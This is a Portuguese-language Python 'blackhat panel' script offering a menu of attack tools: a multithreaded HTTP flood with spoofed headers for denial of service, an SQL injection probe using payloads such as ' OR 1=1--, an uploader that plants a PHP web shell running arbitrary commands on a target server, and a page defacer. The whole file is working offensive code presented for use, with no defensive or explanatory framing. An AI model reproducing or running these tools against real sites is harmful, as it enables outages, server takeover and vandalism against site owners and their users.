import os, socket, threading, requests, random
from time import sleep

def print_logo():
    os.system("clear")
    print("""
\033[1;91m
   ____   ___   ____    ___    ____     ____   _____  ____   ____ _____
  | __ ) / _ \ |  _ \  / _ \  |  _ \   / ___| | ____|/ ___| / ___| ____|
  |  _ \| | | || | | || | | | | |_) | | |     |  _|  \___ \| |  _|  _|  
  | |_) | |_| || |_| || |_| | |  _ <  | |___  | |___  ___) | |_| | |___ 
  |____/ \___/ |____/  \___/  |_| \_\  \____| |_____||____/ \____|_____|

\033[0m
\033[1;93m              ===============[ PAINEL BLACKHAT ]===============\033[0m
\033[1;91m                   Criado por: @gabriel_ribeiro.dev\033[0m
""")

def ddos_real():
    print("\n\033[1;94m[BOCA DE SERPENTE - DDoS]\033[0m")
    url = input("URL alvo: ")
    threads = int(input("Threads: "))
    uas = [
        "Mozilla/5.0 (Windows NT 10.0)", "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh)", "Mozilla/5.0 (iPhone)"
    ]
    def attack():
        while True:
            try:
                headers = {
                    "User-Agent": random.choice(uas),
                    "X-Forwarded-For": ".".join(str(random.randint(0, 255)) for _ in range(4)),
                    "Referer": "https://google.com"
                }
                r = requests.get(url, headers=headers, timeout=4)
                print(f"[{r.status_code}] Alvo atingido por Boca de Serpente")
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack).start()

def sqli_scan():
    print("\n\033[1;96m[BOCA DE SERPENTE - SQLi Scanner]\033[0m")
    base = input("URL vulnerável: ")
    payloads = ["'", "'--", "' OR 1=1--", '" OR 1=1--', "';--"]
    for p in payloads:
        try:
            url = base + p
            r = requests.get(url, timeout=5)
            if any(x in r.text.lower() for x in ["sql", "syntax", "mysql", "error"]):
                print(f"\033[1;92m[+] Vulnerável: {url}\033[0m")
            else:
                print(f"\033[1;90m[-] Seguro: {url}\033[0m")
        except:
            print(f"\033[1;91m[!] Erro em: {url}\033[0m")

def php_uploader():
    print("\n\033[1;95m[BOCA DE SERPENTE - PHP Shell Uploader]\033[0m")
    alvo = input("URL do upload: ")
    shell = "<?php if(isset($_REQUEST['cmd'])){system($_GET['cmd']);} ?>"
    files = {"file": ("shell.php", shell, "application/x-php")}
    try:
        r = requests.post(alvo, files=files)
        if r.status_code == 200:
            print("\033[1;92m[✓] Shell enviada com sucesso como shell.php\033[0m")
        else:
            print("\033[1;91m[X] Upload falhou.\033[0m")
    except Exception as e:
        print(f"\033[1;91m[!] Erro: {e}\033[0m")

def defacer():
    print("\n\033[1;93m[BOCA DE SERPENTE - DEFACER LOCAL]\033[0m")
    path = input("Caminho (ex: /sdcard/site/): ")
    msg = "<h1>HACKED BY BOCA DE SERPENTE</h1><p>Exploit por @gabriel_ribeiro.dev</p>"
    try:
        with open(os.path.join(path, "index.html"), "w") as f:
            f.write(msg)
        print("\033[1;92m[+] Deface feito!\033[0m")
    except Exception as e:
        print(f"\033[1;91m[!] Erro: {e}\033[0m")

def menu():
    while True:
        print_logo()
        print("\033[1;97m[1]\033[0m DDoS Avançado")
        print("\033[1;97m[2]\033[0m Scanner SQL Injection")
        print("\033[1;97m[3]\033[0m PHP Shell Uploader")
        print("\033[1;97m[4]\033[0m Defacer Local")
        print("\033[1;91m[0]\033[0m Sair")
        op = input(">> ")
        if op == "1": ddos_real()
        elif op == "2": sqli_scan()
        elif op == "3": php_uploader()
        elif op == "4": defacer()
        elif op == "0":
            print("\n\033[1;91mEncerrando...\033[0m")
            break
        else:
            print("\033[1;91m[!] Opção inválida.\033[0m")
        input("\n\033[1;90m[ENTER] pra voltar...\033[0m")

menu()
